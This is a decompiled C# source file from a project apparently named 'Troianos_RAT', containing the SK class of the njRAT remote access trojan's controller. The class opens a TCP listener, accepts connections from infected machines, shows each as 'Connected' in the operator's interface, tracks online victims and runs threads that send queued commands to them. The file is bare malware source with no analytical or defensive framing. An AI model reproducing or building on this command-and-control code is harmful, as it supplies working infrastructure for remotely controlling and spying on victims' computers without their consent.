using System;
using System.Collections.Generic;
using System.Drawing;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Troianos_RAT.NJRAT;

namespace Troianos_RAT.njRAT
{
	// Token: 0x02000040 RID: 64
	public class SK
	{
		// Token: 0x060004B1 RID: 1201 RVA: 0x001DA264 File Offset: 0x001D8664
		public SK(int port)
		{
			this.bool_0 = false;
			this.Online = new Collection();
			this.S = new TcpListener(port);
			this.S.Server.SendTimeout = -1;
			this.S.Server.ReceiveTimeout = -1;
			this.S.Server.SendBufferSize = 524288;
			this.S.Server.ReceiveBufferSize = 524288;
			this.S.Start(9999);
			ThreadPool.SetMinThreads(250, 250);
			ThreadPool.SetMaxThreads(250, 250);
			this.Online = new Collection();
			this.REQ = new List<GClass12>();
			int num = 0;
			do
			{
				this.S.BeginAcceptTcpClient(new AsyncCallback(this.accept), null);
				num++;
			}
			while (num <= 10);
			int num2 = 1;
			do
			{
				Thread thread = new Thread(new ParameterizedThreadStart(this.lam__7));
				thread.Start(num2);
				num2++;
			}
			while (num2 <= 16);
		}

		// Token: 0x060004B2 RID: 1202 RVA: 0x001DA390 File Offset: 0x001D8790
		private void lam__7(object object_0)
		{
			this.tp(Conversions.ToInteger(RuntimeHelpers.GetObjectValue(object_0)));
		}

		// Token: 0x060004B3 RID: 1203 RVA: 0x001DA3A8 File Offset: 0x001D87A8
		public void accept(IAsyncResult ar)
		{
			try
			{
				Client client = new Client(this.S.EndAcceptTcpClient(ar), this);
				client.Client.ReceiveTimeout = -1;
				client.Client.SendTimeout = -1;
				client.Client.SendBufferSize = 524288;
				client.Client.ReceiveBufferSize = 524288;
				bool bool_ = Class7.class8_0.bool_2;
				if (bool_)
				{
					Class7.form1_0.Pp1.WRT(new object[]
					{
						Color.LightSteelBlue,
						Class6.smethod_13(),
						client.COI,
						Color.GreenYellow,
						client.ip(),
						"Connected"
					});
				}
				Collection online = this.Online;
				Collection obj = online;
				lock (obj)
				{
					this.Online.Add(client, client.ip(), null, null);
				}
			}
			catch (Exception ex)
			{
			}
			Thread.Sleep(1);
			this.S.BeginAcceptTcpClient(new AsyncCallback(this.accept), null);
		}

		// Token: 0x060004B4 RID: 1204 RVA: 0x001DA4F8 File Offset: 0x001D88F8
		public Client GetClient(string ID)
		{
			Collection online = this.Online;
			Client result;
			lock (online)
			{
				try
				{
					result = (Client)this.Online[ID];
				}
				catch (Exception ex)
				{
					result = null;
				}
			}
			return result;
		}

		// Token: 0x060004B5 RID: 1205 RVA: 0x001DA568 File Offset: 0x001D8968
		public void tp(int i)
		{
			for (;;)
			{
				Thread.Sleep(1);
				GClass12 gclass = null;
				List<GClass12> req = this.REQ;
				List<GClass12> obj = req;
				bool flag;
				lock (obj)
				{
					flag = (this.REQ.Count > 0);
					if (flag)
					{
						gclass = this.REQ[0];
						this.REQ.RemoveAt(0);
					}
				}
				flag = (gclass != null);
				if (flag)
				{
					Class7.smethod_5(new object[]
					{
						gclass.client_0,
						gclass.byte_0
					});
					gclass.bool_0 = true;
				}
			}
		}

		// Token: 0x040002B8 RID: 696
		private bool bool_0;

		// Token: 0x040002B9 RID: 697
		public Collection Online;

		// Token: 0x040002BA RID: 698
		public List<GClass12> REQ;

		// Token: 0x040002BB RID: 699
		public TcpListener S;
	}
}
